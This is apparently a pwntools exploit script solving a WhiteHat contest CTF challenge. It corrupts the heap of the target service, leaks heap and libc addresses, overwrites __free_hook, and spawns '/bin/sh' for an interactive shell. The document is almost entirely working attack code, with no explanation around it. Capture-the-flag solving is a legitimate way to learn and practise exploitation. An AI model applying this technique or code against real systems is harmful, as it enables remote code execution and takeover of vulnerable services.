from pwn import *

#s = remote('192.168.32.95',1234)
s = remote('challenges.whitehatcontest.kr', 24756)
def do(k):
  s.recvuntil('>>>')
  s.sendline(k)
do('c="%s"'%("C"*0x10))
do('a="1"') # malloc 8
do('a="%s"'%("A"*0x30)) # realloc 0x100 , size = 1;
do('b="1"') # malloc 8
do('c=a')
do('c')
heap = u32(s.recvuntil('>>>')[1:5]) - 0x5de8
log.info("HEAP : 0x%x"%heap)
s.sendline('1')
do("1234")
do("1234")
do("1234")
do("1234")
do('sh="%s"'%("C"*0x10))
do('k="1"')
do('k="%s%s"'%("A"*0x30,p32(heap+0x5f60)+"\x04"))
do('l="1"') # malloc 8
do("sh=k")
do("%s"%("A"*0x1000))
do('sh')
libc = u32(s.recvuntil('>>>')[1:5])-0x1b0768-0x48
log.info("LIBC : 0x%x"%libc)  
free_hook = libc+0x1b18b0
s.sendline('1')
do('j="1111"')
do('d="1111"')
do('g="2222"')
do('sh="%s"'%(p32(heap+0x5f00)))
do('r="4444"')
do('r="4444"')
do('t="1234"')
do('y="1"')
do('y="%s"'%("/bin/sh;"+p32(libc+0x3a940)+"AAAA"+p32(free_hook)+'\x04'))
do('r=y')
do('g="'+p32(libc+0x3a940)+'"')
s.interactive()
